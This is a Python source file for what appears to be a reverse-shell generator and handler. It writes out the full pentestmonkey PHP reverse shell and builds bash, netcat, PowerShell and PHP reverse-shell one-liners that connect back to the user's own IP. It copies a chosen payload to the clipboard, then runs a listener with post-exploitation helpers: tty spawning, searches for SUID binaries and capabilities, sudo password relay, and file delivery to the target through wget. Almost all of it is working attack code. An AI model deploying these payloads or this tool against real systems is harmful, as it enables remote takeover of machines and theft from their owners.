import netifaces as ni
import os
import pyperclip
import glob
import socket



reversephp = '''


<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
set_time_limit (0);
$VERSION = "1.0";
$ip = "$$ip$$";  // CHANGE THIS
$port = $$port$$;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();

	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}

	if ($pid) {
		exit(0);  // Parent exits
	}

	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}


	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);


	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>


'''


with open("reverse.php","w") as file:
	file.write(reversephp)

def auto_decal():
	print("----- Auto Decal -----")
	decal = True
	results = ""
	client_socket.send(("echo '<decal>'"+"\n").encode())
	compteur = 0
	while not "<decal>" in results:
		print("Shell preview :",results)
		if compteur>0:
			print("Shell not synchronized")
		results = client_socket.recv(buffer).decode()
		compteur += 1
	while True:
		results = client_socket.recv(buffer).decode()
		if shell in results:
			break
	print("Shell synchronized")
	print("----- End Auto Decal ------")

def exploit_bin():
	global client_socket
	global shell_type
	global shell
	global buffer
	exploitable_list = []
	list = {'apt-get', 'apt', 'ar', 'aria2c', 'arp', 'ash', 'at', 'atobm', 'awk', 'base32', 'base64', 'basenc', 'bash', 'bpftrace', 'bridge', 'bundler', 'busctl', 'busybox', 'byebug', 'cancel', 'capsh', 'cat', 'certbot', 'check_by_ssh', 'check_cups', 'check_log', 'check_memory', 'check_raid', 'check_ssl_cert', 'check_statusfile', 'chmod', 'chown', 'chroot', 'cobc', 'column', 'comm', 'composer', 'cowsay', 'cowthink', 'cp', 'cpan', 'cpio', 'cpulimit', 'crash', 'crontab', 'csh', 'csplit', 'csvtool', 'cupsfilter', 'curl', 'cut', 'dash', 'date', 'dd', 'dialog', 'diff', 'dig', 'dmesg', 'dmsetup', 'dnf', 'docker', 'dpkg', 'dvips', 'easy_install', 'eb', 'ed', 'emacs', 'env', 'eqn', 'ex', 'exiftool', 'expand', 'expect', 'facter', 'file', 'find', 'finger', 'flock', 'fmt', 'fold', 'ftp', 'gawk', 'gcc', 'gdb', 'gem', 'genisoimage', 'ghc', 'ghci', 'gimp', 'git', 'grep', 'gtester', 'gzip', 'hd', 'head', 'hexdump', 'highlight', 'hping3', 'iconv', 'iftop', 'install', 'ionice', 'ip', 'irb', 'jjs', 'join', 'journalctl', 'jq', 'jrunscript', 'ksh', 'ksshell', 'latex', 'ld.so', 'ldconfig', 'less', 'logsave', 'look', 'ltrace', 'lua', 'lualatex', 'luatex', 'lwp-download', 'lwp-request', 'mail', 'make', 'man', 'mawk', 'more', 'mount', 'mtr', 'mv', 'mysql', 'nano', 'nawk', 'nc', 'nice', 'nl', 'nmap', 'node', 'nohup', 'npm', 'nroff', 'nsenter', 'octave', 'od', 'openssl', 'openvpn', 'openvt', 'paste', 'pdb', 'pdflatex', 'pdftex', 'perl', 'pg', 'php', 'pic', 'pico', 'pip', 'pkexec', 'pkg', 'pr', 'pry', 'psql', 'puppet', 'python', 'rake', 'readelf', 'red', 'redcarpet', 'restic', 'rev', 'rlogin', 'rlwrap', 'rpm', 'rpmquery', 'rsync', 'ruby', 'run-mailcap', 'run-parts', 'rview', 'rvim', 'scp', 'screen', 'script', 'sed', 'service', 'setarch', 'sftp', 'sg', 'shuf', 'slsh', 'smbclient', 'snap', 'socat', 'soelim', 'sort', 'split', 'sqlite3', 'ss', 'ssh-keygen', 'ssh-keyscan', 'ssh', 'start-stop-daemon', 'stdbuf', 'strace', 'strings', 'su', 'sysctl', 'systemctl', 'tac', 'tail', 'tar', 'taskset', 'tbl', 'tclsh', 'tcpdump', 'tee', 'telnet', 'tex', 'tftp', 'time', 'timeout', 'tmux', 'top', 'troff', 'ul', 'unexpand', 'uniq', 'unshare', 'update-alternatives', 'uudecode', 'uuencode', 'valgrind', 'vi', 'view', 'vigr', 'vim', 'vimdiff', 'vipw', 'virsh', 'watch', 'wc', 'wget', 'whois', 'wish', 'xargs', 'xelatex', 'xetex', 'xmodmap', 'xxd', 'xz', 'yelp', 'yum', 'zip', 'zsh', 'zsoelim', 'zypper'}
	client_socket.send(("find / -perm -u=s 2>/dev/null"+"\n").encode())
	print("suid :")
	while True:
		results = client_socket.recv(buffer).decode()
		if shell in results:
			break
		for i in results.split("/"):
			try:
				if i.replace("\r\n","").replace("\n","").replace("\r","") in list:
					print(results).split("\r\n")[0]
			except AttributeError:
				pass
	print("capabilities :")
	client_socket.send(("getcap / -r 2>/dev/null"+"\n").encode())
	while True:
		results = client_socket.recv(buffer).decode()
		if shell in results:
			break
		for i in list:
			if i in results:
				print(results)
def clean_shell_type(shell):
	if "\r\n" in shell:
		shell = shell.split("\r\n")
	elif "\n" in shell:
		shell = shell.split("\n")
	elif "\r" in shell:
		shell = shell.split("\r")
	for i in shell:
		if not "echo $0" in i:
			return i
	return shell

def deliver_file():
	import time
	print("----- File Deliver -----")
	print(f"You are currently in :{os.getcwd()}")
	print(f"Displaying disponible files : {', '.join([i for i in glob.glob('*.*')])}")
	import random
	port = random.randint(8000,9000)
	file = input("Which file do you want to upload ? :")
	os.system(f"python3 -m http.server {port} &")
	print("Waiting 3 seconds for the server to start")
	time.sleep(3)
	print("Delivering file")
	client_socket.send((f"wget http://{ip}:{port}/{file}"+"\n").encode())
	results = ""
	while not shell in results:
		print(results)
		results = client_socket.recv(buffer).decode()
	print("Done")
	print("----- End File Deliver -----")


def detect_shell_type():
	global client_socket
	global shell_type
	global shell
	global buffer

	print("detecting shell type")
	liste_shell = []
	client_socket.send(("echo $0"+"\n").encode())
	liste_shell.append(client_socket.recv(buffer).decode())
	liste_shell.append(client_socket.recv(buffer).decode())
	for i in liste_shell:
		if i != "" and i!= shell and i!="echo $0" :
			shell_type = i
	shell_type = clean_shell_type(shell_type)
	print("shell type :",shell_type)
	if 'bash' in shell_type.split('\r')[0].split("/"):
		shell = shell.split(":")[0].split(";")[1]
	elif "sh" in shell_type.split("\r")[0].split("/"):
		shell = shell
	elif "zsh" in shell_type.split("\r")[0].split("/"):
		print("Zsh Not implemented")
		pass
	else:
		print("Cannot detect")

def tty():
	print("----- Invoke tty -----")
	global shell
	global command_pannel
	temp_shell = shell
	client_socket.send(("python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"+"\n").encode())
	while True:
		results = client_socket.recv(buffer).decode()
		if shell in results:
			break
	if results == temp_shell:
		client_socket.send(("python -c 'import pty;pty.spawn(\"/bin/bash\")'"+"\n").encode())
		while True:
			results = client_socket.recv(buffer).decode()
			if shell in results:
				break
	if results == temp_shell:
		client_socket.send(("bash -p"+"\n").encode())
		while True:
			results = client_socket.recv(buffer).decode()
			if shell in results:
				break
	if results == temp_shell:
		print("Session has not been changed")
	else:
		print("tty spawned")
		shell = results
	detect_shell_type()
	command_pannel = False
	print("----- End Invoke tty -----")

def start_listener(port):
	global client_socket
	global buffer
	global shell
	global command_pannel
	global s
	host = "0.0.0.0"
	port = port
	buffer = 1024
	s = socket.socket()

	s.bind((host, port))
	s.listen(5)
	print(f"Listening at {host}:{port} ...")
	client_socket, client_address = s.accept()
	print(f"{client_address[0]} on port : {client_address[1]}                    [+]Connected")

	results = "a"
	shell = client_socket.recv(buffer).decode()

	#print("shell :",shell)

	shell_to_display = shell

	command_pannel = True

	disponible_commands = ["\n-> Exploitation:","shell  : Invoke shell","\n-> Interface:","exit  : kill the reverse shell","other  : Display specific commands","help  : display this message", "\n-> Inside Rev Shell Commands:","#help  : Display help message"]
	other_commands = {"tty":"Invoke tty","exploit_bin":"Search for exploitable binaries","deliver_file":"Upload files"}
	shell_commands = ["#help  : Display this message","#kill  : Exit the reverse shell and the program", "#exit  : Return to command panel","#decal  : decal shell commands if not synchronized","#other:command  : use command panel's commands"]

	tty()
	auto_decal()
	while True:
		if command_pannel == False:
			liste = []
			command = input(shell_to_display)
			client_socket.send((command+"\n").encode())
			if command.lower() == "#kill":
				client_socket.send(("exit"+"\n").encode())
				break
			elif command.lower() == "#exit":
				command_pannel = True
			elif command.lower() == "#help":
				for i in shell_commands:
					print(i)
			elif command.lower() == "#decal":
				print(client_socket.recv(buffer).decode())
			elif "#other:" in command.lower():
				command = command.split(":")[1]
				command_pannel = True
				exec(f'{command}()')
				command_pannel = False
			elif command.lower() == "exit":
				break
			sudo = False
			while True:
				results = client_socket.recv(buffer).decode()
				for i in results.split("\n"):
					if i!=command:
						if "[sudo]" in i:
							sudo = True
						liste.append(i)
				if shell in results:
					break
				if sudo == True:
					if '[sudo]' and ":" in results:
						password = input('Password >> ')
						client_socket.send((password+"\n").encode())
				sudo = False
			while "" in liste:
				liste.remove("")
			print("\n".join(liste[:-1]))
			shell_to_display = results.split("\n")[-1]
		elif command_pannel == True:
			command = input(">>")
			if command == "help":
				for i in disponible_commands:
					print(f"{i}")
			elif command == "shell":
				command_pannel = False
			elif command == "exit":
				client_socket.send(("exit"+"\n").encode())
				break
			elif command == "other":
				for i in other_commands.keys():
					print(f"{i} : {other_commands[i]}")
			elif command in other_commands:
				exec(command+f"()")
			elif command not in other_commands:
				os.system(command)
	client_socket.close()

	s.close()


banner = """
 @@@@@@   @@@  @@@  @@@@@@@@  @@@       @@@       @@@@@@@    @@@@@@    @@@@@@   @@@@@@@   @@@@@@@
@@@@@@@   @@@  @@@  @@@@@@@@  @@@       @@@       @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@
!@@       @@!  @@@  @@!       @@!       @@!       @@!  @@@  @@!  @@@  @@!  @@@  @@!  @@@  @@!  @@@
!@!       !@!  @!@  !@!       !@!       !@!       !@   @!@  !@!  @!@  !@!  @!@  !@!  @!@  !@!  @!@
!!@@!!    @!@!@!@!  @!!!:!    @!!       @!!       @!@!@!@   @!@  !@!  @!@!@!@!  @!@!!@!   @!@  !@!
 !!@!!!   !!!@!!!!  !!!!!:    !!!       !!!       !!!@!!!!  !@!  !!!  !!!@!!!!  !!@!@!    !@!  !!!
     !:!  !!:  !!!  !!:       !!:       !!:       !!:  !!!  !!:  !!!  !!:  !!!  !!: :!!   !!:  !!!
    !:!   :!:  !:!  :!:        :!:       :!:      :!:  !:!  :!:  !:!  :!:  !:!  :!:  !:!  :!:  !:!
:::: ::   ::   :::   :: ::::   :: ::::   :: ::::   :: ::::  ::::: ::  ::   :::  ::   :::   :::: ::
:: : :     :   : :  : :: ::   : :: : :  : :: : :  :: : ::    : :  :    :   : :   :   : :  :: :  :
                                                                                                    \n"""
def clear():
        os.system("clear")
        print(banner)
global ip
try:
	ip = ni.ifaddresses("tun0")[ni.AF_INET][0]['addr']
except:
	try:
		ip = ni.ifaddresses("eth0")[ni.AF_INET][0]['addr']
	except:
		try:
			ip = ni.ifaddresses("wlan0")[ni.AF_INET][0]['addr']
		except:
			ip = input("The Listening ip :")
choice1 = 1000
port = 1235
clear()

bash = {1:f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",2:f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",3:f"sh -i >& /dev/udp/{ip}/{port} 0>&1"}
netcat = {1:f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",2:f"nc -e /bin/bash {ip} {port}"}
powershell = {1:f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("'+ip+'",'+str(port)+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'}
php = {1:f"php -r '$sock=fsockopen("+'"'+ip + '"'+","+str(port)+');exec("/bin/sh -i <&3 >&3 2>&3");'+"'",2:"File"}

liste = {1:bash,2:netcat,3:powershell,4:php}
liste_name = {1:"Bash",2:"Netcat",3:"Powershell",4:"Php"}
ext = {"Php":".php","Bash":".sh","Powershell":".ps1"}

[print(f'{i}.{liste_name[i]}') for i in liste.keys()]

while choice1 not in liste.keys():
	choice1 = int(input("\nMake Your Choice :"))
language = liste[choice1]

choice = 1000
clear()

for i in language.keys():
	print(f"{i}.{language[i]}")

while choice not in language.keys():
	choice = int(input("\nMake Your Choice :"))

payload = language[choice]
if payload=="File":
	if f'reverse{ext[liste_name[choice1]]}' in glob.glob("*.*"):
		with open(f'reverse{ext[liste_name[choice1]]}','r') as file:
			template = file.read().replace("$$ip$$",ip)
			template = template.replace("$$port$$",str(port))
			pyperclip.copy(template)
		print("Templates copied in clipboard")
	else:
		print("No such file")
else:
	print(f'Copied in clipboard : {payload}')
	pyperclip.copy(payload)


if input("Would you like to start a listener ? y/n :").upper()=="Y":
	try:
		if input("1.Netcat (No Tools)\n2.Custom Listener (Post exploitation Tools)\nYour Choice :")==1:
			os.system(f"nc -nvlp {port}")
		else:
				start_listener(port)
	except KeyboardInterrupt:
		print("Cancelled by user")
else:
	print("Ended")

global client_socket
global s
try:
	client_socket.close()
	s.close()
except:
	pass
os.remove("reverse.php")
